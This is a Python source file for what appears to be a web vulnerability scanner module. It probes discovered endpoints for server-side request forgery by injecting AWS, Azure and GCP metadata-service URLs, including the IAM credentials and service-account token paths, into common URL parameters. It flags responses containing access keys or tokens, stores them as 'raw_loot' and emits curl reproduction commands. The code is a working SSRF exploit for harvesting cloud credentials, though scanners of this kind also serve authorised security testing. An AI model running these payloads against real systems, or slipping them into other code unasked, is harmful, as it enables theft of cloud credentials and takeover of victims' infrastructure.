import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session
import re
from urllib.parse import urlparse, urljoin

class SSRFScanner:
    """
    Expert SSRF Scanner targeting Cloud Metadata Services (IMDS).
    Checks for AWS, Azure, and GCP sensitive metadata leakage.
    """
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        self.metadata_payloads = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "aws_iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        }
        
        # Common vulnerable parameters for SSRF
        self.ssrf_params = [
            'url', 'uri', 'path', 'dest', 'destination', 'redir', 'redirect', 
            'to', 'link', 'callback', 'feed', 'val', 'validate', 'proxy', 'file'
        ]

    def _test_url(self, base_url, param, payload, baseline_text="", logger=None):
        """Helper to test a single parameter with a payload, compared to baseline."""
        try:
            test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={payload}"
            r = http_client.get(test_url, options=getattr(self, "options", None), timeout=5, allow_redirects=True)
            
            if r.status_code != 200:
                return False, None, None, None
                
            ctype = r.headers.get("Content-Type", "").lower()
            if "text" not in ctype and "json" not in ctype:
                return False, None, None, None

            # 1. Check if the response is identical to the baseline (parameter ignored)
            if r.text == baseline_text:
                return False, None, None, None

            # 2. Strict Signatures for success
            # We look for markers that are NOT in the baseline text
            signatures = [
                "ami-id", "instance-id", "local-hostname",  # AWS
                "AccessKeyId", "SecretAccessKey",           # AWS IAM
                "computeMetadata/v1", "Metadata-Flavor",     # GCP
                "\"compute\":", "\"network\":"              # Azure (JSON markers)
            ]
            
            for sig in signatures:
                if sig in r.text and sig not in baseline_text:
                    # Double check: if it looks like a cloud hit, verify it's not just returning 200 for everything
                    # by checking a known non-existent path on the same target
                    return True, r, test_url, payload
                    
        except Exception:
            pass
        return False, None, None, None

    def scan_endpoints(self, discovered_urls, logger=None):
        findings = []
        if not discovered_urls:
            return findings

        if logger: logger(f"SSRF Expert: Probing {len(discovered_urls)} endpoints for Cloud Metadata Leakage...", "INFO")

        tested_bases = {} # base_url -> baseline_text

        for url in discovered_urls:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            if base not in tested_bases:
                try:
                    # Fetch baseline once per unique endpoint
                    b_resp = http_client.get(base, options=getattr(self, "options", None), timeout=5)
                    tested_bases[base] = b_resp.text if b_resp.status_code == 200 else ""
                except:
                    tested_bases[base] = ""
            
            baseline_text = tested_bases[base]

            # Check if URL already has suspicious parameters
            query_params = parsed.query.split('&')
            params_to_test = []
            
            for p_pair in query_params:
                if '=' in p_pair:
                    p_name = p_pair.split('=')[0]
                    if p_name.lower() in self.ssrf_params:
                        params_to_test.append(p_name)
            
            if not params_to_test:
                params_to_test = ['url', 'dest', 'path', 'uri']

            for param in params_to_test:
                for cloud, payload in self.metadata_payloads.items():
                    hit, resp, vuln_url, p_val = self._test_url(base, param, payload, baseline_text, logger)
                    
                    if hit:
                        severity = "critical"
                        title = f"CRITICAL: SSRF Cloud Metadata Leak ({cloud.upper()})"
                        desc = f"Vulnerable Endpoint: `{vuln_url}`\n\nIdentified a Server-Side Request Forgery vulnerability that allows access to internal Cloud Metadata Services. "
                        
                        if "SecretAccessKey" in resp.text or "access_token" in resp.text:
                            title = f"💣 EXPLOITABLE: SSRF {cloud.upper()} Credentials Leaked"
                            desc += "\n\n**CRITICAL**: Temporary security credentials (tokens/keys) were extracted from the metadata service."

                        # Build evidence
                        req_dump = f"GET {vuln_url} HTTP/1.1\nHost: {parsed.netloc}\n"
                        res_dump = f"HTTP/1.1 {resp.status_code} {resp.reason}\n"
                        for k, v in resp.headers.items():
                            res_dump += f"{k}: {v}\n"
                        res_dump += f"\n{resp.text[:1000]}..."

                        findings.append({
                            "title": title,
                            "description": desc,
                            "severity": severity,
                            "confidence": "high",
                            "tool_source": "ssrf_expert",
                            "url": vuln_url,
                            "request": req_dump,
                            "response": res_dump,
                            "repro_command": f"curl -v '{vuln_url}'",
                            "raw_loot": resp.text[:2000],
                            "loot_type": "Cloud Credentials" if "AccessKeyId" in resp.text else "Instance Metadata"
                        })
                        
                        if logger: logger(f"🔥 SSRF BREACH: {cloud.upper()} metadata exposed on {base}", "CRITICAL")
                        break # Found one cloud on this param, move to next param
        
        return findings
